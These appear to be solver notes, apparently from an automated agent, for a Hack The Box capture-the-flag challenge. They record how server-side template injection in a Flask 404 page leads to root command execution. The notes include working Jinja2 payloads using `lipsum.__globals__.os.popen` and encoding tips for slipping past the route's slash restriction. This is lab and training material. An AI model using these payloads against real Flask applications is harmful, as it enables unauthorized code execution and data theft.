# const-flask (under-construction placeholder) — verified 2026-09-18

Chain: custom 404 template calling `str(user_path)` with Jinja rendering →
path-injection SSTI (full `{{…}}` namespace) → `lipsum.__globals__.os.popen`
→ read `/flag.txt` in the response.

## Evidence ancestry (live target http://154.57.164.82:31684)
- Recon: bare page "Site still under construction. Proudly powered by
  Flask/Jinja2"; Werkzeug/1.0.1 Python/3.9.0 header; no other routes.
- Probes (hooks ledger):
  - `/` 200 placeholder; query strings ignored; static aliases 404 (plain).
  - any other path → custom 404 `The page '<str>X</str>' could not be found`
    — a template quoting the REQUEST PATH via a str() call.
  - `{{7*7}}` rendered as 49 → SSTI live on the NotFound template.
  - `{{config}}` returned the Config dict; `{{lipsum.__globals__.os.environ}}`
    returned env segments (first-pass validation.
- RCE: the `lipsum.__globals__.os` namespace works without any 'import':
  `{{lipsum.__globals__.os.popen('id').read()}}` → uid=0(root).
- Command strings containing `/` (e.g. `ls /`) are blocked by the URL: mode
  `<str:'<str>'>` in the route pattern does not allow slashes; a slash-free
  shell command still works (`ls`, `pwd`, `cat flag.txt`).
- `pwd` reports CWD = `/` and `ls` shows `flag.txt` at the root.
- `popen('cat flag.txt')` →
  **HTB{REDACTED}**
- Flag read from a live response rendered by the custom 404 template.
- state: challenges/const-flask/state.json holds the hook ledger.

## Traps
- `<str>` does not match a path with an unencoded slash on the raw URL —
  percent-encode the WHOLE payload once (Flask decodes it once) and choose
  slash-free shell commands, otherwise the default Werkzeug 404 hits.
- The `{{config}}` output is HTML-escaped in the str() call; reading it
  becomes manual work — go through `lipsum.__globals__.os.popen` to get
  raw command output instead.
- root user (uid=0) confirms this is a single-container app; the flag is a
  file at the filesystem root, not an env var.

Solver: /tmp/opencode — re-use the standard `lipsum` SSTI family; no other
special builds required.